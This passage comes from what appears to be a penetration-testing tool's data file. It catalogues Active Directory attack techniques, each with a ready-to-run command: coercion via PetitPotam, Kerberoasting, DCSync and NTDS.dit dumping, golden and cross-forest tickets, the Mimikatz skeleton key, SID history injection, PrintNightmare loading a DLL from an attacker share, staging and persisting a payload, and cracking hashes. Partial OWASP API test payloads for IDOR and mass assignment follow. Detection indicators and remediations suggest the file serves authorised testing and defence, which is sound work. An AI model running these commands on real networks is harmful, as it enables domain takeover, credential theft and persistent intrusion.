        description: "Test for default credentials on domain-joined systems including printers, IPMI, and management interfaces.",
        command: "crackmapexec smb <range>/24 -u administrator -p 'P@ssw0rd' --no-bruteforce",
        tool: "CrackMapExec",
        indicators: "Successful login with default credentials on domain-joined systems"
      },
      {
        name: "Coerced Authentication (PetitPotam)",
        description: "Force domain controller to authenticate to an attacker-controlled server using EFS RPC calls.",
        command: "python3 PetitPotam.py <attacker-ip> <dc-ip>",
        tool: "PetitPotam",
        indicators: "Unexpected NTLM authentication from DC to external hosts"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // Phase 2: Enumeration
  // -------------------------------------------------------------------------
  {
    phase: "Enumeration",
    techniques: [
      {
        name: "BloodHound Collection",
        description: "Collect Active Directory relationship data for graph-based attack path analysis.",
        command: "bloodhound-python -d <domain> -u <user> -p '<pass>' -c all -ns <dc-ip> --zip",
        tool: "BloodHound (bloodhound-python)",
        indicators: "Excessive LDAP queries from single source, Event ID 4662 for AD object access"
      },
      {
        name: "Domain Controller Identification",
        description: "Identify all domain controllers, their roles, and OS versions in the domain.",
        command: "crackmapexec smb <range>/24 -u <user> -p '<pass>' --dc-only",
        tool: "CrackMapExec",
        indicators: "Normal reconnaissance activity if authenticated"
      },
      {
        name: "User Enumeration",
        description: "Enumerate all domain users including attributes like description, last logon, and password policy.",
        command: "ldapdomaindump -u '<domain>\\<user>' -p '<pass>' <dc-ip> -o ldap-dump/",
        tool: "ldapdomaindump",
        indicators: "LDAP queries for user objects with extensive attribute requests"
      },
      {
        name: "Group Enumeration",
        description: "Enumerate domain groups and their members to identify high-value targets and nested group memberships.",
        command: "net group /domain && net group 'Domain Admins' /domain && net group 'Enterprise Admins' /domain",
        tool: "net commands, PowerView",
        indicators: "Queries for sensitive group memberships"
      },
      {
        name: "GPO Enumeration",
        description: "Enumerate Group Policy Objects to discover security settings, mapped drives, scheduled tasks, and startup scripts.",
        command: "crackmapexec smb <dc-ip> -u <user> -p '<pass>' -M gpp_autologon && crackmapexec smb <dc-ip> -u <user> -p '<pass>' -M gpp_password",
        tool: "CrackMapExec",
        indicators: "SYSVOL access and GPO file reads"
      },
      {
        name: "Share Enumeration",
        description: "Enumerate accessible network shares and analyze contents for sensitive information.",
        command: "crackmapexec smb <range>/24 -u <user> -p '<pass>' --shares && smbmap -H <target> -u <user> -p '<pass>' -r",
        tool: "CrackMapExec, smbmap",
        indicators: "Broad share enumeration across multiple hosts"
      },
      {
        name: "SPN Enumeration",
        description: "Enumerate Service Principal Names to discover service accounts and their associated services.",
        command: "GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc-ip> -request",
        tool: "Impacket (GetUserSPNs.py)",
        indicators: "LDAP queries filtering on servicePrincipalName attribute"
      },
      {
        name: "Trust Relationship Mapping",
        description: "Map domain and forest trust relationships to identify cross-trust attack paths.",
        command: "nltest /domain_trusts /all_trusts /v && Get-ADTrust -Filter * -Properties *",
        tool: "nltest, PowerShell AD module",
        indicators: "Trust relationship queries from non-admin accounts"
      },
      {
        name: "ADCS Enumeration",
        description: "Enumerate Active Directory Certificate Services for templates, CAs, and potential misconfigurations.",
        command: "certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc-ip> -text -stdout",
        tool: "Certipy",
        indicators: "Certificate template and CA enumeration queries"
      },
      {
        name: "DNS Enumeration",
        description: "Enumerate DNS records within Active Directory to discover internal hosts, services, and infrastructure.",
        command: "adidnsdump -u '<domain>\\<user>' -p '<pass>' <dc-ip> && cat records.csv",
        tool: "adidnsdump",
        indicators: "DNS zone transfer or extensive DNS queries"
      },
      {
        name: "Delegation Enumeration",
        description: "Enumerate accounts with constrained, unconstrained, or resource-based constrained delegation configured.",
        command: "findDelegation.py <domain>/<user>:<pass> -dc-ip <dc-ip>",
        tool: "Impacket (findDelegation.py)",
        indicators: "LDAP queries filtering on delegation attributes (msDS-AllowedToDelegateTo)"
      },
      {
        name: "ACL Enumeration",
        description: "Enumerate Access Control Lists on AD objects to find exploitable permissions like WriteDACL, GenericAll, or ForceChangePassword.",
        command: "Import-Module .\\PowerView.ps1; Find-InterestingDomainAcl -ResolveGUIDs | Export-CSV acls.csv",
        tool: "PowerView",
        indicators: "Extensive ACL enumeration queries on AD objects"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // Phase 3: Privilege Escalation
  // -------------------------------------------------------------------------
  {
    phase: "Privilege Escalation",
    techniques: [
      {
        name: "Token Impersonation",
        description: "Impersonate tokens of higher-privileged users found on the compromised system.",
        command: "meterpreter> load incognito && list_tokens -u && impersonate_token '<domain>\\<admin-user>'",
        tool: "Metasploit Incognito",
        indicators: "Event ID 4624 with impersonation level, unexpected token usage"
      },
      {
        name: "Unquoted Service Path",
        description: "Exploit unquoted service paths to execute malicious binaries when the service starts.",
        command: "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\"",
        tool: "wmic, PowerUp",
        indicators: "Service failure events, unexpected binaries in Program Files"
      },
      {
        name: "Weak Service Permissions",
        description: "Modify services with weak DACL permissions to execute arbitrary commands as SYSTEM.",
        command: "accesschk.exe /accepteula -uwcqv <user> * && sc config <service> binpath=\"C:\\Windows\\Temp\\payload.exe\"",
        tool: "Accesschk, sc",
        indicators: "Service configuration changes (Event ID 7040), unexpected service binaries"
      },
      {
        name: "DLL Hijacking",
        description: "Place malicious DLLs in locations where privileged applications search for libraries.",
        command: "procmon.exe (filter: Result=NAME NOT FOUND, Path contains .dll)",
        tool: "Process Monitor, custom DLLs",
        indicators: "Unexpected DLL loads from writable directories"
      },
      {
        name: "AlwaysInstallElevated",
        description: "Exploit the AlwaysInstallElevated registry setting to install malicious MSI packages as SYSTEM.",
        command: "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
        tool: "reg query, msfvenom",
        indicators: "MSI installation events from non-admin users"
      },
      {
        name: "Stored Credentials",
        description: "Search for stored credentials in registry, files, and credential manager.",
        command: "cmdkey /list && dir /s /b C:\\Users\\*password* C:\\Users\\*cred* 2>nul && reg query HKLM /f password /t REG_SZ /s",
        tool: "cmdkey, reg, dir",
        indicators: "Access to credential stores and sensitive registry keys"
      },
      {
        name: "Kernel Exploits",
        description: "Exploit unpatched kernel vulnerabilities to escalate to SYSTEM privileges.",
        command: "systeminfo > systeminfo.txt && python3 windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt",
        tool: "Windows Exploit Suggester, precompiled exploits",
        indicators: "Unexpected kernel-mode code execution, system crashes"
      },
      {
        name: "PrintSpoofer / Potato Attacks",
        description: "Abuse SeImpersonatePrivilege to escalate from service accounts to SYSTEM through named pipe impersonation.",
        command: "PrintSpoofer64.exe -i -c cmd",
        tool: "PrintSpoofer, GodPotato, JuicyPotatoNG",
        indicators: "Named pipe creation from service accounts, Event ID 4624 type 2"
      },
      {
        name: "GPP Passwords",
        description: "Extract and decrypt passwords stored in Group Policy Preferences XML files on SYSVOL.",
        command: "crackmapexec smb <dc-ip> -u <user> -p '<pass>' -M gpp_password",
        tool: "CrackMapExec, gpp-decrypt",
        indicators: "SYSVOL access, Groups.xml file reads"
      },
      {
        name: "LAPS Password Reading",
        description: "Read Local Administrator Password Solution passwords if the user has read permissions.",
        command: "crackmapexec ldap <dc-ip> -u <user> -p '<pass>' -M laps",
        tool: "CrackMapExec",
        indicators: "LDAP queries for ms-Mcs-AdmPwd attribute"
      },
      {
        name: "ACL Abuse - ForceChangePassword",
        description: "Exploit ForceChangePassword ACL permission to reset a higher-privileged user password.",
        command: "net rpc password <target-user> '<new-pass>' -U '<domain>/<user>%<pass>' -S <dc-ip>",
        tool: "net rpc, PowerView",
        indicators: "Event ID 4724 (password reset) from unexpected source"
      },
      {
        name: "ACL Abuse - GenericAll on User",
        description: "Exploit GenericAll permission on a user to reset their password or set SPN for Kerberoasting.",
        command: "Set-ADAccountPassword -Identity <target> -NewPassword (ConvertTo-SecureString '<pass>' -AsPlainText -Force)",
        tool: "PowerShell AD module, PowerView",
        indicators: "Password change events, SPN modifications on user accounts"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // Phase 4: Lateral Movement
  // -------------------------------------------------------------------------
  {
    phase: "Lateral Movement",
    techniques: [
      {
        name: "PsExec",
        description: "Execute commands on remote systems using the PsExec service creation method.",
        command: "psexec.py <domain>/<user>:<pass>@<target> cmd.exe",
        tool: "Impacket (psexec.py)",
        indicators: "Event ID 7045 (new service), Event ID 4624 type 3, PSEXESVC service creation"
      },
      {
        name: "WMI Execution",
        description: "Execute commands remotely using Windows Management Instrumentation.",
        command: "wmiexec.py <domain>/<user>:<pass>@<target>",
        tool: "Impacket (wmiexec.py)",
        indicators: "Event ID 4624 type 3, WMI process creation events, wmiprvse.exe spawning cmd.exe"
      },
      {
        name: "WinRM / Evil-WinRM",
        description: "Establish remote PowerShell sessions through Windows Remote Management.",
        command: "evil-winrm -i <target> -u <user> -p '<pass>'",
        tool: "Evil-WinRM",
        indicators: "Event ID 4624 type 3 with WinRM, Event ID 91/168 in Microsoft-Windows-WinRM"
      },
      {
        name: "DCOM Execution",
        description: "Execute commands remotely through Distributed Component Object Model (DCOM) interfaces.",
        command: "dcomexec.py <domain>/<user>:<pass>@<target> 'whoami'",
        tool: "Impacket (dcomexec.py)",
        indicators: "DCOM event logs, unexpected mmc.exe or excel.exe spawning processes"
      },
      {
        name: "SMB File Transfer",
        description: "Transfer files to remote systems using SMB shares for tool staging and data collection.",
        command: "smbclient //<target>/C$ -U '<domain>/<user>%<pass>' -c 'put payload.exe Windows\\Temp\\payload.exe'",
        tool: "smbclient, copy",
        indicators: "Large file writes to admin shares (C$, ADMIN$)"
      },
      {
        name: "RDP Lateral Movement",
        description: "Move laterally using Remote Desktop Protocol with valid credentials.",
        command: "xfreerdp /v:<target> /u:<domain>\\<user> /p:<pass> /dynamic-resolution +clipboard",
        tool: "xfreerdp, rdesktop",
        indicators: "Event ID 4624 type 10, RDP connection events (Event ID 1149)"
      },
      {
        name: "Pass-the-Ticket",
        description: "Use stolen Kerberos tickets to authenticate to services without knowing the plaintext password.",
        command: "export KRB5CCNAME=<ticket>.ccache && psexec.py <domain>/<user>@<target> -k -no-pass",
        tool: "Impacket, Rubeus",
        indicators: "Ticket reuse from unexpected hosts, Event ID 4769 mismatches"
      },
      {
        name: "Overpass-the-Hash",
        description: "Convert an NTLM hash to a Kerberos ticket for authentication to services that require Kerberos.",
        command: "getTGT.py <domain>/<user> -hashes <lm:ntlm> -dc-ip <dc-ip>",
        tool: "Impacket (getTGT.py)",
        indicators: "TGT request from non-standard source, Event ID 4768 anomalies"
      },
      {
        name: "SSH Lateral Movement",
        description: "Move laterally to Linux systems using SSH with discovered credentials or keys.",
        command: "ssh -i id_rsa <user>@<target> && sshpass -p '<pass>' ssh <user>@<target>",
        tool: "SSH, sshpass",
        indicators: "SSH authentication events, unexpected key-based logins"
      },
      {
        name: "SCCM Lateral Movement",
        description: "Abuse SCCM client push installation or application deployment for lateral movement.",
        command: "SharpSCCM.exe exec -p payload.exe -s <sccm-server>",
        tool: "SharpSCCM",
        indicators: "SCCM client push events, unexpected software deployment"
      },
      {
        name: "Scheduled Task Remote Creation",
        description: "Create scheduled tasks on remote systems to execute commands with SYSTEM privileges.",
        command: "schtasks /create /s <target> /u <domain>\\<user> /p '<pass>' /tn 'Updater' /tr 'C:\\Windows\\Temp\\payload.exe' /sc once /st 00:00 /ru SYSTEM",
        tool: "schtasks",
        indicators: "Event ID 4698 (scheduled task created), Event ID 4702 (task updated)"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // Phase 5: Persistence
  // -------------------------------------------------------------------------
  {
    phase: "Persistence",
    techniques: [
      {
        name: "Golden Ticket",
        description: "Forge Kerberos TGTs using the KRBTGT account hash to maintain domain-wide access indefinitely.",
        command: "ticketer.py -nthash <krbtgt-hash> -domain-sid <sid> -domain <domain> -extra-sid <sid> administrator",
        tool: "Impacket (ticketer.py), Mimikatz",
        indicators: "TGT with abnormal lifetime, Event ID 4769 for non-existent accounts"
      },
      {
        name: "Silver Ticket",
        description: "Forge service tickets to maintain access to specific services without contacting the KDC.",
        command: "ticketer.py -nthash <service-hash> -domain-sid <sid> -domain <domain> -spn <SPN> administrator",
        tool: "Impacket (ticketer.py), Mimikatz",
        indicators: "Service ticket used without corresponding TGT request (no Event ID 4768)"
      },
      {
        name: "Skeleton Key",
        description: "Patch the LSASS process on a DC to add a master password that works for any domain account.",
        command: "mimikatz.exe \"privilege::debug\" \"misc::skeleton\" \"exit\"",
        tool: "Mimikatz",
        indicators: "LSASS memory modifications, DC reboot clears the skeleton key"
      },
      {
        name: "DCSync Backdoor",
        description: "Grant DCSync permissions to a controlled account for persistent credential extraction.",
        command: "Add-ObjectAcl -TargetDistinguishedName 'DC=<domain>,DC=<tld>' -PrincipalSamAccountName <user> -Rights DCSync",
        tool: "PowerView",
        indicators: "ACL changes on domain root, Event ID 5136 for DACL modifications"
      },
      {
        name: "AdminSDHolder Abuse",
        description: "Modify the AdminSDHolder container to propagate ACL changes to all protected groups.",
        command: "Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName <user> -Rights All",
        tool: "PowerView",
        indicators: "ACL changes on AdminSDHolder, SDProp propagation events"
      },
      {
        name: "Machine Account Persistence",
        description: "Create a machine account and add it to privileged groups for persistent access.",
        command: "addcomputer.py -computer-name 'FAKE01$' -computer-pass '<pass>' -dc-ip <dc-ip> <domain>/<user>:<pass>",
        tool: "Impacket (addcomputer.py)",
        indicators: "New machine account creation (Event ID 4741), group membership changes"
      },
      {
        name: "Shadow Credentials",
        description: "Add alternative credentials (Key Credentials) to a user or computer account for persistent access.",
        command: "certipy shadow auto -u <user>@<domain> -p '<pass>' -account <target>",
        tool: "Certipy",
        indicators: "msDS-KeyCredentialLink attribute modification (Event ID 5136)"
      },
      {
        name: "Certificate-Based Persistence",
        description: "Request certificates for persistence as they remain valid even after password changes.",
        command: "certipy req -u <user>@<domain> -p '<pass>' -ca <ca-name> -template User",
        tool: "Certipy",
        indicators: "Certificate enrollment events (Event ID 4886/4887)"
      },
      {
        name: "Registry Run Key Persistence",
        description: "Add registry run keys for automatic execution when a user logs in.",
        command: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Windows\\Temp\\payload.exe /f",
        tool: "reg",
        indicators: "Registry modification events, Event ID 4657"
      },
      {
        name: "Scheduled Task Persistence",
        description: "Create scheduled tasks that execute periodically for persistent access.",
        command: "schtasks /create /tn 'Microsoft\\Windows\\Maintenance\\WindowsUpdate' /tr 'C:\\Windows\\Temp\\payload.exe' /sc daily /st 09:00 /ru SYSTEM",
        tool: "schtasks",
        indicators: "Event ID 4698, Event ID 4702"
      },
      {
        name: "WMI Event Subscription",
        description: "Create WMI event subscriptions to execute commands on system events like startup.",
        command: "Invoke-WMIPersistence -EventName 'WindowsParentalControlMigration' -Command 'C:\\Windows\\Temp\\payload.exe' -Trigger Startup",
        tool: "PowerShell, WMI",
        indicators: "WMI event subscription creation, __EventFilter and __EventConsumer objects"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // Phase 6: Domain Dominance
  // -------------------------------------------------------------------------
  {
    phase: "Domain Dominance",
    techniques: [
      {
        name: "DCSync",
        description: "Replicate domain credentials by impersonating a domain controller using the Directory Replication Service.",
        command: "secretsdump.py <domain>/<user>:<pass>@<dc-ip> -just-dc-ntlm",
        tool: "Impacket (secretsdump.py)",
        indicators: "Event ID 4662 with replication rights, DRS GetNCChanges requests"
      },
      {
        name: "NTDS.dit Extraction",
        description: "Extract the NTDS.dit database file containing all domain password hashes.",
        command: "secretsdump.py <domain>/<user>:<pass>@<dc-ip> -use-vss -outputfile ntds",
        tool: "Impacket (secretsdump.py)",
        indicators: "VSS shadow copy creation on DC, NTDS.dit file access"
      },
      {
        name: "Cross-Domain Trust Exploitation",
        description: "Exploit trust relationships to move between domains and forests.",
        command: "ticketer.py -nthash <krbtgt-hash> -domain-sid <child-sid> -domain <child-domain> -extra-sid <enterprise-admins-sid> administrator",
        tool: "Impacket (ticketer.py)",
        indicators: "Cross-domain TGT requests, SID history manipulation"
      },
      {
        name: "SID History Injection",
        description: "Inject SID history to add Enterprise Admin or Domain Admin SIDs to a controlled account.",
        command: "mimikatz.exe \"privilege::debug\" \"sid::patch\" \"sid::add /sam:<user> /new:<admin-sid>\" \"exit\"",
        tool: "Mimikatz",
        indicators: "SID history changes (Event ID 4765), unexpected SIDs in tokens"
      },
      {
        name: "Forest Trust Abuse",
        description: "Exploit forest trust relationships to access resources across forest boundaries.",
        command: "ticketer.py -nthash <trust-key> -domain-sid <sid> -domain <domain> -spn krbtgt/<target-domain> -target-domain <target-domain> administrator",
        tool: "Impacket (ticketer.py)",
        indicators: "Cross-forest authentication anomalies, TGT referral manipulation"
      },
      {
        name: "Group Policy Modification",
        description: "Modify Group Policy Objects to push configuration changes or execute commands across the domain.",
        command: "SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents 'net localgroup administrators <user> /add' --GPOName 'Default Domain Policy'",
        tool: "SharpGPOAbuse",
        indicators: "GPO modification events (Event ID 5136), unusual GPO updates"
      },
      {
        name: "ADCS Persistence (ESC8)",
        description: "Exploit NTLM relay to AD Certificate Services web enrollment to obtain certificates for any user.",
        command: "ntlmrelayx.py -t http://<ca-ip>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
        tool: "Impacket (ntlmrelayx.py)",
        indicators: "Certificate enrollment from relayed authentication"
      },
      {
        name: "Domain Controller Backdoor",
        description: "Install persistent backdoor on domain controllers for long-term access.",
        command: "reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' /v UseLogonCredential /t REG_DWORD /d 1 /f",
        tool: "reg",
        indicators: "WDigest registry modification, cleartext passwords in memory"
      },
      {
        name: "Password Hash Dump and Analysis",
        description: "Dump all domain password hashes and analyze for weak passwords, password reuse, and patterns.",
        command: "secretsdump.py <domain>/<admin>:<pass>@<dc-ip> -just-dc-ntlm -outputfile domain-hashes && hashcat -m 1000 domain-hashes.ntds /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule",
        tool: "Impacket, Hashcat",
        indicators: "Mass credential extraction, DRS replication events"
      },
      {
        name: "Print Nightmare (CVE-2021-1675/CVE-2021-34527)",
        description: "Exploit the PrintNightmare vulnerability to achieve remote code execution on domain controllers.",
        command: "python3 CVE-2021-1675.py <domain>/<user>:<pass>@<dc-ip> '\\\\<attacker>\\share\\payload.dll'",
        tool: "PrintNightmare exploit",
        indicators: "Print spooler service crashes, DLL loading events, Event ID 808"
      }
    ]
  }
];

// -----------------------------------------------------------------------------
// 4. API_METHODOLOGY -- OWASP API Security Top 10 Testing
// -----------------------------------------------------------------------------

const API_METHODOLOGY = [
  // -------------------------------------------------------------------------
  // API1: Broken Object Level Authorization
  // -------------------------------------------------------------------------
  {
    category: "API1: Broken Object Level Authorization",
    checks: [
      {
        name: "IDOR via Numeric ID",
        description: "Test whether changing numeric object IDs in API requests allows access to other users' resources.",
        test: "GET /api/v1/users/1001/profile with user 1002's token; iterate through IDs 1-10000",
        remediation: "Implement authorization checks on every object access, use non-sequential UUIDs"
      },
      {
        name: "IDOR via UUID",
        description: "Test whether UUIDs in API requests can be guessed or enumerated to access unauthorized resources.",
        test: "Collect UUIDs from various API responses and use them in different user contexts",
        remediation: "Authorization checks independent of object ID format, do not rely on UUID unguessability"
      },
      {
        name: "IDOR in File Access",
        description: "Test whether file download or access endpoints properly validate resource ownership.",
        test: "GET /api/v1/documents/doc-id-123/download with another user's token",
        remediation: "Verify file ownership before serving, use indirect references"
      },
      {
        name: "IDOR in Nested Resources",
        description: "Test IDOR in nested API resources where parent-child relationship authorization might be missing.",
        test: "GET /api/v1/organizations/1/projects/2/tasks/3 -- modify each ID independently",
        remediation: "Validate authorization at each level of resource nesting"
      },
      {
        name: "IDOR via GraphQL",
        description: "Test GraphQL queries and mutations for broken object-level authorization.",
        test: "query { user(id: \"other-user-id\") { email ssn address } }",
        remediation: "Implement field-level authorization in GraphQL resolvers"
      },
      {
        name: "IDOR in Batch Operations",
        description: "Test batch or bulk API operations for authorization bypass when processing multiple objects.",
        test: "POST /api/v1/batch { \"ids\": [\"own-id\", \"other-user-id-1\", \"other-user-id-2\"] }",
        remediation: "Validate authorization for each object in batch operations"
      },
      {
        name: "IDOR via Parameter Pollution",
        description: "Test whether duplicate parameters or array injection bypasses object-level authorization.",
        test: "GET /api/v1/data?user_id=own-id&user_id=other-id",
        remediation: "Strict parameter parsing, reject duplicate parameters"
      },
      {
        name: "IDOR in WebSocket Messages",
        description: "Test WebSocket message handlers for broken object-level authorization.",
        test: "Send WebSocket messages with other users' object IDs and observe responses",
        remediation: "Apply same authorization checks in WebSocket handlers as REST endpoints"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // API2: Broken Authentication
  // -------------------------------------------------------------------------
  {
    category: "API2: Broken Authentication",
    checks: [
      {
        name: "Credential Stuffing",
        description: "Test whether the API is vulnerable to credential stuffing attacks using known breached credentials.",
        test: "Automate login attempts with breached credential lists; check rate limiting and lockout",
        remediation: "Implement rate limiting, account lockout, CAPTCHA, and credential breach detection"
      },
      {
        name: "JWT Algorithm Confusion",
        description: "Test for JWT algorithm confusion attacks (none, HS256 with public key, key confusion).",
        test: "python3 jwt_tool.py <token> -X a (algorithm confusion) -X n (none algorithm)",
        remediation: "Explicitly verify JWT algorithm on server side, reject 'none' algorithm"
      },
      {
        name: "Token Expiration",
        description: "Test whether access tokens and refresh tokens have appropriate expiration times.",
        test: "Use an expired token; check token lifetime in JWT claims; test refresh token rotation",
        remediation: "Short-lived access tokens (15 min), refresh token rotation with revocation"
      },
      {
        name: "API Key Security",
        description: "Test API key handling including transmission security, rotation capability, and scope restrictions.",
        test: "Check if API keys in URLs, test key scope, check rate limits per key",
        remediation: "API keys in headers only, scoped permissions, rotation mechanism, rate limiting"
      },
      {
        name: "OAuth Token Theft",
        description: "Test for OAuth token theft through redirect URI manipulation, token leakage in referrer headers.",
        test: "Modify redirect_uri to attacker domain; check for token in URL fragment; test state parameter",
        remediation: "Strict redirect_uri validation, use authorization code flow with PKCE"
      },
      {
        name: "Weak Token Generation",
        description: "Analyze token generation for predictability, insufficient entropy, or sequential patterns.",
        test: "Collect 1000+ tokens and analyze with statistical tests; check for sequential components",
        remediation: "Use CSPRNG for token generation, minimum 256-bit entropy"
      },
      {
        name: "Broken Password Reset",
        description: "Test password reset API for token predictability, user enumeration, and rate limiting.",
        test: "POST /api/v1/password-reset with various emails; analyze reset tokens; test token reuse",
        remediation: "Cryptographic reset tokens, consistent responses, rate limiting, token expiration"
      },
      {
        name: "Authentication Bypass via HTTP Methods",
        description: "Test whether authentication can be bypassed by changing HTTP methods on protected endpoints.",
        test: "Try GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD on authenticated endpoints without token",
        remediation: "Enforce authentication on all HTTP methods for protected resources"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // API3: Broken Object Property Level Authorization
  // -------------------------------------------------------------------------
  {
    category: "API3: Broken Object Property Level Authorization",
    checks: [
      {
        name: "Excessive Data Exposure",
        description: "Test whether API responses include more data fields than necessary for the requesting user.",
        test: "Compare API response fields with what's displayed in UI; check for hidden sensitive fields",
        remediation: "Implement response filtering, only return fields needed by the client"
      },
      {
        name: "Mass Assignment - Role Elevation",
        description: "Test whether adding role or permission fields to update requests elevates user privileges.",
        test: "PUT /api/v1/users/me { \"name\": \"test\", \"role\": \"admin\", \"isAdmin\": true }",
        remediation: "Whitelist allowed update fields, ignore unknown or protected properties"
      },
      {
        name: "Mass Assignment - Balance/Credit",
        description: "Test whether financial fields can be modified through mass assignment in update operations.",
        test: "PATCH /api/v1/account { \"balance\": 999999, \"credits\": 999999 }",
        remediation: "Separate financial operations from profile updates, strict field whitelisting"
      },
      {
        name: "Hidden Field Discovery",
        description: "Discover hidden API response fields by requesting different content types or using verbose parameters.",
        test: "Add ?fields=* or ?include=all to requests; change Accept header; check API docs for undocumented fields",
        remediation: "Explicit field selection in API, no wildcard field inclusion"
      },
      {
        name: "Property-Level Authorization",
        description: "Test whether individual properties have proper authorization based on user role and context.",
        test: "Request sensitive fields (SSN, salary, internal_notes) as different user roles",
        remediation: "Field-level authorization checks based on user role and data classification"
      },
      {
        name: "Nested Object Mass Assignment",
        description: "Test mass assignment through nested objects and array properties in API requests.",
        test: "PUT /api/v1/profile { \"address\": { \"verified\": true }, \"permissions\": [\"admin\"] }",
        remediation: "Deep property validation, reject unexpected nested objects"
      },
      {
        name: "GraphQL Field Authorization",
        description: "Test GraphQL queries for unauthorized access to sensitive fields through custom queries.",
        test: "{ user(id:\"me\") { email salary ssn internalNotes adminPanel { users { passwords } } } }",
        remediation: "Implement field-level authorization in each GraphQL resolver"
      },
      {
        name: "Content-Type Switching",
        description: "Test whether changing Content-Type allows mass assignment that would be blocked in the original format.",
        test: "Send same update as JSON, XML, form-urlencoded, multipart; compare accepted fields",
        remediation: "Consistent field validation regardless of content type"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // API4: Unrestricted Resource Consumption
  // -------------------------------------------------------------------------
  {
    category: "API4: Unrestricted Resource Consumption",
    checks: [
      {
        name: "Missing Rate Limiting",
        description: "Test whether API endpoints have rate limiting to prevent abuse and denial of service.",
        test: "Send 1000+ requests in rapid succession; check for 429 responses and rate limit headers",
        remediation: "Implement rate limiting per user/IP with appropriate thresholds"
      },
      {
        name: "Pagination Abuse",
        description: "Test whether API pagination can be abused to retrieve excessive amounts of data.",
        test: "GET /api/v1/users?limit=999999&offset=0 ; test with negative, zero, and extremely large values",
        remediation: "Enforce maximum page size, validate pagination parameters"
      },
      {
        name: "GraphQL Query Depth",
        description: "Test GraphQL APIs for query depth attacks that can cause excessive server resource consumption.",
        test: "{ user { friends { friends { friends { friends { friends { name } } } } } } }",
        remediation: "Implement query depth limiting, query complexity analysis, and timeout"
      },
      {
        name: "File Upload Size Limits",
        description: "Test file upload endpoints for missing size restrictions that could exhaust storage or memory.",
        test: "Upload increasingly large files (1MB, 10MB, 100MB, 1GB); test chunked upload abuse",
        remediation: "Enforce file size limits, use streaming uploads, validate before processing"
      },
      {
        name: "Batch Request Abuse",
        description: "Test batch API endpoints for missing limits on the number of operations per request.",
        test: "POST /api/v1/batch with 10000+ operations in a single request",
        remediation: "Limit batch size, implement per-request resource budgets"
      },
      {
        name: "Regular Expression DoS",
        description: "Test input fields for ReDoS vulnerabilities using crafted strings that cause catastrophic backtracking.",
        test: "Submit long strings of repeating characters to regex-validated fields: 'aaaaaaaaaaaaaaaaaaaaa!'",
        remediation: "Use safe regex patterns, implement regex timeout, validate input length first"
      },
      {
        name: "Compute-Intensive Operations",
        description: "Test endpoints that perform intensive computations (search, export, report generation) for resource exhaustion.",
        test: "Request large exports, complex searches, report generation for all data simultaneously",
        remediation: "Async processing for heavy operations, resource quotas, queue management"
      },
      {
        name: "SMS/Email Bombing",
        description: "Test whether notification endpoints can be abused to send unlimited SMS or email messages.",
        test: "Trigger OTP/verification repeatedly to same number/email; test rate limits",
        remediation: "Rate limit notification endpoints, implement cooldown periods"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // API5: Broken Function Level Authorization
  // -------------------------------------------------------------------------
  {
    category: "API5: Broken Function Level Authorization",
    checks: [
      {
        name: "Admin Endpoint Access",
        description: "Test whether administrative API endpoints are accessible to non-admin users.",
        test: "Access /api/v1/admin/*, /api/internal/*, /api/v1/management/* with regular user token",
        remediation: "Role-based access control on all admin endpoints, separate admin API gateway"
      },
      {
        name: "HTTP Method-Based Authorization",
        description: "Test whether authorization differs based on HTTP method (GET allowed but POST/DELETE not checked).",
        test: "If GET /api/v1/users is allowed, test DELETE /api/v1/users/1 with same token",
        remediation: "Authorization checks on every method for every endpoint"
      },
      {
        name: "API Version Bypass",
        description: "Test whether older API versions have weaker authorization that can be exploited.",
        test: "If /api/v2/admin requires auth, test /api/v1/admin, /api/admin, /admin",
        remediation: "Consistent authorization across all API versions, deprecate old versions"
      },
      {
        name: "Path Manipulation",
        description: "Test whether URL path manipulation can bypass function-level authorization checks.",
        test: "/api/v1/users/admin%2fdashboard, /api/v1/./admin/./users, /API/V1/ADMIN/USERS",
        remediation: "Normalize paths before authorization checks, case-insensitive comparison"
      },
      {
        name: "Internal API Exposure",
        description: "Test whether internal-only API endpoints are accessible from the external network.",
        test: "Discover internal endpoints from docs/code and test accessibility: /internal/*, /debug/*, /metrics",
        remediation: "Network segmentation for internal APIs, authentication required on all endpoints"
      },
      {
        name: "Privilege Escalation via API",
        description: "Test whether API operations can be chained to escalate privileges from user to admin.",
        test: "Create organization -> assign self as admin -> access admin functions",
        remediation: "Server-side role assignment, prevent self-elevation through API calls"
      },
      {
        name: "Undocumented Endpoint Discovery",
        description: "Discover and test undocumented API endpoints that may lack proper authorization.",
        test: "ffuf -u https://<target>/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -H 'Authorization: Bearer <token>'",
        remediation: "Deny-by-default authorization, audit all endpoints regularly"
      },
      {
        name: "Webhook Administration",
        description: "Test whether webhook management functions are properly restricted to authorized users.",
        test: "POST /api/v1/webhooks with regular user to create/modify webhooks pointing to attacker server",
        remediation: "Restrict webhook management to admin users, validate webhook destinations"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // API6: Unrestricted Access to Sensitive Business Flows
  // -------------------------------------------------------------------------
  {
    category: "API6: Unrestricted Access to Sensitive Business Flows",
    checks: [
